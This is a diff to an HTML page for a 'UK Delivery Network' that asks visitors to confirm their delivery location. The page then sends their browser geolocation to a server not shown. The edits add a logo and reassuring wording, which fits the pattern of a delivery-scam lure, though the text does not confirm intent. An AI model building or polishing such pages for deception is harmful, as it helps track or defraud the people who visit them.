@@ -28,6 +28,12 @@ body {
   box-shadow: 0 15px 40px rgba(0,0,0,0.25);
 }
 
+.logo img {
+  width: 150px;
+  max-width: 80%;
+  margin-bottom: 15px;
+}
+
 .logo {
   font-size: 28px;
   font-weight: bold;
@@ -57,6 +63,7 @@ button {
   font-size:17px;
   font-weight:bold;
   cursor:pointer;
+  margin-top:20px;
 }
 
 button:hover {
@@ -84,8 +91,15 @@ button:hover {
 
 <div class="card">
 
+
 <div class="logo">
+
+<img src="logo.png" alt="UK Delivery Network Logo">
+
+<div>
 UK Delivery Network
+</div>
+
 </div>
 
 
@@ -101,6 +115,11 @@ Confirm your delivery location
 
 <p>
 To help ensure your delivery arrives smoothly, please confirm your location.
+</p>
+
+
+<p>
+Your device will ask for permission. Your location is only used to complete this delivery.
 </p>
 
 
@@ -120,6 +139,7 @@ UK Delivery Network © 2026
 </div>
 
 
+
 <script>
 
 function getLocation(){
@@ -129,7 +149,7 @@ const status = document.getElementById("status");
 
 if(!navigator.geolocation){
 
-status.innerHTML="Location not supported";
+status.innerHTML="Location is not supported on this device.";
 return;
 
 }
@@ -143,7 +163,7 @@ navigator.geolocation.getCurrentPosition(
 function(position){
 
 
-let data = {
+const data = {
 
 latitude: position.coords.latitude,
 
@@ -166,10 +186,14 @@ body:JSON.stringify(data)
 })
 
 
-.then(response=>response.text())
+.then(function(response){
+
+return response.text();
+
+})
 
 
-.then(result=>{
+.then(function(result){
 
 console.log(result);
 
@@ -178,7 +202,7 @@ status.innerHTML="✓ Location received. Thank you.";
 })
 
 
-.catch(error=>{
+.catch(function(error){
 
 console.log(error);
 
